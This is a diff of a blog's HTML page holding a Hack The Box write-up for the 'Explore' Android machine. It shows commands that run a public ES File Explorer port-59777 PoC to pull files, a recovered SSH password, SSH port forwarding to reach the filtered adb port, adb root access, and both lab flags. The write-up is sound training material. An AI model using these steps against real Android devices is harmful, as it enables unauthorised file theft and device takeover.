@@ -13,13 +13,13 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/en/htb/explore/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2021-10-30T00:00:00+01:00">
-<meta property="article:modified_time" content="2022-02-23T10:00:12+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-02-23T11:55:42+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/Explore/Explore.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Explore">
 <meta itemprop=description content="Hack The Box. Android. Easy machine. This is a mobile device that uses a vulnerable application that exposes files that provide access via SSH. Some port scanning, port forwarding and Android skills are needed to compromise this device"><meta itemprop=datePublished content="2021-10-30T00:00:00+01:00">
-<meta itemprop=dateModified content="2022-02-23T10:00:12+01:00">
-<meta itemprop=wordCount content="568">
+<meta itemprop=dateModified content="2022-02-23T11:55:42+01:00">
+<meta itemprop=wordCount content="573">
 <meta itemprop=keywords content="cve,port-forwarding,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Explore">
@@ -177,26 +177,32 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></div><p>This machine has ports 2222 (SSH), 37019, 42135 (ES File Explorer) and 59777 (Bukkit JSONAPI httpd for Minecraft) open. Port 5555 is filtered.</p>
 <h2 id=exploiting-es-file-explorer>Exploiting ES File Explorer</h2>
 <p>There is a <a href=https://github.com/fs0c131y/ESFileExplorerOpenPortVuln>PoC</a> on Android ES File Explorer on port 59777, written in Python. With this, some files and apps can be listed and even downloaded:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 poc.py --ip 10.10.10.247 --cmd listPics
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> poc.py --ip 10.10.10.247 --cmd listPics
 [*] Executing command: listPics on 10.10.10.247
 [*] Server responded with: 200
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>{&#34;name&#34;:&#34;concept.jpg&#34;, &#34;time&#34;:&#34;4/21/21 02:38:08 AM&#34;, &#34;location&#34;:&#34;/storage/emulated/0/DCIM/concept.jpg&#34;, &#34;size&#34;:&#34;135.33 KB (138,573 Bytes)&#34;, }, 
-{&#34;name&#34;:&#34;anc.png&#34;, &#34;time&#34;:&#34;4/21/21 02:37:50 AM&#34;, &#34;location&#34;:&#34;/storage/emulated/0/DCIM/anc.png&#34;, &#34;size&#34;:&#34;6.24 KB (6,392 Bytes)&#34;, },
-{&#34;name&#34;:&#34;creds.jpg&#34;, &#34;time&#34;:&#34;4/21/21 02:38:18 AM&#34;, &#34;location&#34;:&#34;/storage/emulated/0/DCIM/creds.jpg&#34;, &#34;size&#34;:&#34;1.14 MB (1,200,401 Bytes)&#34;, },
-{&#34;name&#34;:&#34;224_anc.png&#34;, &#34;time&#34;:&#34;4/21/21 02:37:21 AM&#34;, &#34;location&#34;:&#34;/storage/emulated/0/DCIM/224_anc.png&#34;, &#34;size&#34;:&#34;124.88 KB (127,876 Bytes)&#34;}
-</code></pre></div><p>We see four images saved in the device. The interesting one is called <code>creds.jpg</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 poc.py --ip 10.10.10.247 --get-file /storage/emulated/0/DCIM/creds.jpg 
+
+{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },  
+{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
+{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
+{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
+</code></pre></div>
+<p>We see four images saved in the device. The interesting one is called <code>creds.jpg</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> poc.py --ip 10.10.10.247 --get-file /storage/emulated/0/DCIM/creds.jpg  
 [*] Getting file: /storage/emulated/0/DCIM/creds.jpg
         from: 10.10.10.247
 [*] Server responded with: 200
 [*] Writing to file: creds.jpg
-</code></pre></div><p>The following <code>creds.jpg</code> image contains the credentials to login via SSH on port 2222 (<code>kristi:Kr1sT!5h@Rp3xPl0r3!</code>):</p>
-<p><img src=../../../images/HTB/Explore/Explore-creds.jpg alt=Credentials></p>
+</code></pre></div>
+<p>The following <code>creds.jpg</code> image contains the credentials to login via SSH on port 2222 (<code>kristi:Kr1sT!5h@Rp3xPl0r3!</code>):</p>
+<p><img src=/images/HTB/Explore/Explore-creds.jpg alt=Credentials></p>
 <h2 id=ssh-into-the-device>SSH into the device</h2>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh kristi@10.10.10.247 -p <span style=color:#ae81ff>2222</span> 
-</code></pre></div><p>The <code>user.txt</code> flag is located at <code>/sdcard</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>:/ $ ls -la /sdcard/
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> kristi@10.10.10.247 -p 2222  
+Password authentication
+Password:
+:/ $
+</code></pre></div>
+<p>The <code>user.txt</code> flag is located at <code>/sdcard</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>:/ $ ls -la /sdcard/
 total 52
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Alarms
 drwxrwx--- 3 root everybody 4096 2021-03-13 17:16 Android
@@ -204,7 +210,7 @@ drwxrwx--- 2 root everybody 4096 2021-04-21 02:38 DCIM
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:37 Download
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Movies
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Music
-drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Notifications 
+drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Notifications  
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Pictures
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Podcasts
 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Ringtones
@@ -213,32 +219,35 @@ drwxrwx--- 2 root everybody 4096 2021-04-21 02:12 dianxinos
 -rw-rw---- 1 root everybody   33 2021-03-13 18:28 user.txt
 :/ $ cat /sdcard/user.txt
 f32017174c7c7e8f50c6da52891ae250
-</code></pre></div><h2 id=rooting-the-device>&ldquo;Rooting&rdquo; the device</h2>
+</code></pre></div>
+<h2 id=rooting-the-device>&ldquo;Rooting&rdquo; the device</h2>
 <p>For &ldquo;rooting&rdquo; the device, it is needed to connect using <code>adb</code> and then enter <code>adb root</code>, <code>adb shell</code>. However, to connect to the device, <code>adb</code> needs port 5555 to be open in the device. But this port is filtered, as shown on the <code>nmap</code> output.</p>
 <p>To bypass this protection, the connection can be done with SSH port forwarding:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh -L 5000:localhost:5555 kristi@10.10.10.247 -p <span style=color:#ae81ff>2222</span> 
-</code></pre></div><p>And now, <code>adb</code> can connect to the device from <code>localhost:5000</code> and get the <code>root.txt</code> flag:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ adb kill-server
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ adb start-server
-* daemon not running; starting now at tcp:5037 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -fNL 5000:localhost:5555 kristi@10.10.10.247 -p 2222  
+</code></pre></div>
+<p>And now, <code>adb</code> can connect to the device from <code>localhost:5000</code> and get the <code>root.txt</code> flag:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>adb</span> kill-server
+
+<span class=code-cyan>$</span> <span class=code-dark-green>adb</span> start-server
+* daemon not running; starting now at tcp:5037  
 * daemon started successfully
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ adb connect 127.0.0.1:5000
+
+<span class=code-cyan>$</span> <span class=code-dark-green>adb</span> connect 127.0.0.1:5000
 connected to 127.0.0.1:5000
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ adb devices
+
+<span class=code-cyan>$</span> <span class=code-dark-green>adb</span> devices
 List of devices attached
 127.0.0.1:5000  device
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ adb root
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ adb shell
-x86_64:/ # find / -name root.txt 2&gt;/dev/null
+
+<span class=code-cyan>$</span> <span class=code-dark-green>adb</span> root
+
+<span class=code-cyan>$</span> <span class=code-dark-green>adb</span> shell
+x86_64:/ # find / -name root.txt 2>/dev/null
 /data/root.txt
 x86_64:/ # cat /data/root.txt
 f04fc82b6d49b41c9b08982be59338c5
-</code></pre></div><div class="mt6 instapaper_ignoref">
+</code></pre></div>
+<div class="mt6 instapaper_ignoref">
 </div>
 </div>
 <aside aria-label=aside class="w-20-l mt6-l aside-desktop">
